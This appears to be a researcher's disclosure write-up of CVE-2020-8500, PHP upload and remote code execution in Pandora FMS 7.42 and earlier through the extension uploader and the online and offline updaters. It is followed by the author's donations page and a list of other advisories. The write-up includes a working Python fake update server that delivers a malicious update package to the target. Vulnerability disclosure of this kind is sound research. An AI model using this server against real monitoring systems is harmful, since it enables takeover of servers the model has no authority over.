=== Content from k4m1ll0.com_ca053ffb_20250119_121359.html ===


[Back to the advisories](https://k4m1ll0.com/advisories)

# PHP file upload and remote code execution in Pandora FMS <= 7.42 (Extension,Online/Offline Update) (CVE-2020-8500)

#pandorafms#hacking#exploit#rce#cve

Last Modified: 2024.01.19.

If you find it valuable, you can support me by making a donation. [Donate now](https://k4m1ll0.com/donations.html).

In Pandora FMS 742 and below it is possible to upload PHP files via the Extension Uploader and via the Online Installer. The enterprise edition offers the Offline installer as a feature. With the offline installer it is possible to do exactly the same.

What is allowed to a Web Admin and what is not?

 It is not allowed to upload a PHP file even with an Admin account, because it is dangarous. (Vendor)

## Key Topics

* The packages are not signed, there are no certificates in use.
* There are no cheksums in use.
* The Update Manager URL can be changed via the Web Application.
  (I think this parameter should be set during install and it can be stored in a config file.)
* The dangarous PHP functions are allowed here, because it is a Monitoring System.
* What about Man in the Middle Attacks?
* The uploaded files accessible without authentication.
* Directory Listing

I know a button on a webpage is comfortable, but security starts where comfortability ends. What is good for a Wordpress site, maybe it is not good for a Monitoring System.

# Technical Details

Note: The vulnerabilities exploitable only with a Web Admin account.

## 1. Online Updater

The online updater is a simple thing. The update package is a simple "oum" file (Online Update Manager). This file is a zip file which can contain PHP files.

The Update Manager URL can be configured (Update Manager -> Update Manager Options). This URL works only with https!

Generating Pem files

```

openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem

```

Fake Pandora FMS Manager (You can execute it with python3 ./fake\_pandorafms\_https\_server)

```

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
from io import BytesIO
import json

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/zip')
        self.end_headers()
        self.wfile.write(open('./k44.oum','rb').read())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(b'This is POST request. ')
        response.write(b'Received: ')
        response.write(body)
        self.wfile.write(json.dumps([{ 'version': 'k4m1ll0_fake_version','file_name':'https://192.168.0.103:2000/k44.oum'}], ensure_ascii=False).encode())

httpd = HTTPServer(('0.0.0.0', 2000), SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile="key.pem",
        certfile='cert.pem', server_side=True)

httpd.serve_forever()

```

Preparing the update package

![4](./cve-2020-8500/04.png)

Configuring the URL to use my fake server

![5](./cve-2020-8500/05.png)

Checking updates

![6](./cve-2020-8500/06.png)

Install the Fake Update

![7](./cve-2020-8500/07.png)

Install - Success

![8](./cve-2020-8500/08.png)

Proof

![9](./cve-2020-8500/09.png)
### Demo Video

Note: **The installed files are accessible without authentication.**

## 2. Extension Upload

admin tools->extension manager->extension uploader

* The vendor do not want to allow to us upload PHP files even with an Admin account.
* They allow to upload extensions and extensions are zipped PHP files.
* The extracted php files are accessible from outside without authentication.

Upload the "extension", which contains "k44\_extension.php" file

![1](./cve-2020-8500/01.png)

The extracted file is accessible without Authentication.

![2](./cve-2020-8500/02.png)

Proof

![3](./cve-2020-8500/03.png)
### Demo Video

## 3. Offline Updater

The offline updater works the same way as the online updater, the difference is just the uploading. The offline installer is an Enterprise feature now, but
earlier it was part of the community edition. I performed the demo with the old version:

I used the same out file.

![20](./cve-2020-8500/20.png)

Upload

![21](./cve-2020-8500/21.png)

Update

![22](./cve-2020-8500/22.png)

Proof

![23](./cve-2020-8500/23.png)

Demo Video

© 2019-2024 KamillÃ³ Matek (k4m1ll0) All Rights Reserved



=== Content from k4m1ll0.com_52f5598f_20250119_135446.html ===

[Main](http://k4m1ll0.com)
[Advisories](./advisories)
[Press](./press)
[Donations](./donations)

## Support My Love Projects

Your contribution means a lot to me. These research projects are my passion, and I have invested a lot of time and resources into them. Unfortunately, I do not have any external supporters, and I cover all the expenses myself.

Dealing with vendors, especially in the field of cybersecurity, can be challenging, and it's even more difficult in my country (Hungary). Your support helps me continue these projects and bring valuable results to the community.

If you appreciate my work, you can contribute in the following ways:

### Securely donate with PayPal

![](https://www.paypal.com/en_HU/i/scr/pixel.gif)

### Scan the QR code to securely donate with PayPal

![PayPal QR Code](./paypal_qrcode.png)

### If you prefer cryptocurrency, you can donate using Bitcoin. Click to copy the BTC address to the clipboard!

bc1qxza23cdutkf4pjujy8yfpqp6rd4w4k3wntpp79

[![Buy Me A Coffee](https://cdn.buymeacoffee.com/buttons/v2/default-blue.png)](https://www.buymeacoffee.com/matekkamilj)

© 2019-2024 KamillÃ³ Matek (k4m1ll0) All Rights Reserved



=== Content from k4m1ll0.com_1179bfe1_20250119_135446.html ===

[Main](https://k4m1ll0.com)
[Advisories](./advisories)
[Press](./press)
[Donations](./donations)

## Advisories

* [Mercusys MW325R Authenticated Remote Code Execution - CVE-2023-52162
  Read more](https://k4m1ll0.com/cve-2023-52162.html)
* [Mercusys MW325R UART shell + "language-switch" vulnerablity. - CVE-2023-46297
  Read more](https://k4m1ll0.com/cve-2023-46297.html)
* [Forcepoint DLP One - Hidden Python Console - Initial access - Red teaming
  Read more](https://k4m1ll0.com/forcepoint-dlp-redteam.html)
* [Microsoft Shift F10 Bypass + Autopilot privesc
  Read more](https://k4m1ll0.com/ShiftF10Bypass-and-privesc.html)
* [TP-Link TLWR840n euv620 password reset CVE-2021-46122
  Read more](https://k4m1ll0.com/cve-tplink-tlwr840n-euV620-password-reset.html)
* [TP-Link TLWR840N EU V5 and V6.20 UART shell - CVE-2022-29402
  Read more](https://k4m1ll0.com/cve-tplink-tlwr840N-uart-shell.html)
* [TP-Link TLWR840N EU V5 Remote Code Execution - CVE-2021-41653
  Read more](https://k4m1ll0.com/cve-2021-41653.html)
* [Pandora FMS 755 Chained Remote Code Execution - HTACCESS - CVE-2021-36697 and CVE-2021-36698.
  Read more](https://k4m1ll0.com/chained_exploit_htaccess.html)
* [Pandora FMS 754 - Sensitive info on the client side - CVE-2021-34075
  Read more](https://k4m1ll0.com/cve-2021-34075.html)
* [Pandora FMS 754 XSS - Chained Remote Code Execution - CVE-2021-35501 and CVE-2021-34074
  Read more](https://k4m1ll0.com/cve-pandorafms754-chained-xss-rce.html)
* [Pandora FMS 742 File Repository Chat history - CVE-2020-8497
  Read more](https://k4m1ll0.com/cve-2020-8497.html)
* [Pandora FMS 742 File Manager + Remote Code Execution 2 - CVE-2020-7935
  Read more](https://k4m1ll0.com/cve-2020-7935.html)
* [Pandora FMS 742 File Repository + Remote Code Execution - CVE-2020-8511
  Read more](https://k4m1ll0.com/cve-2020-8511.html)
* [Pandora FMS 743 Online/Offline Updater/Extension PHP upload + Remote Code Execution - CVE-2020-8500
  Read more](https://k4m1ll0.com/cve-2020-8500.html)
* [Pandora FMS 742 Remote Code Execution File Manager CVE-2019-20050
  Read more](https://k4m1ll0.com/cve-2019-20050.html)
* [Pandora FMS 7.xx multiple XSS vulnerabilities - CVE-2019-19968
  Read more](https://k4m1ll0.com/cve-2019-19968.html)
* [Pandora FMS Remote Code Execution (Alert Manager) - CVE-2019-19681
  Read more](https://k4m1ll0.com/cve-2019-19681.html)

© 2019-2024 KamillÃ³ Matek (k4m1ll0) All Rights Reserved


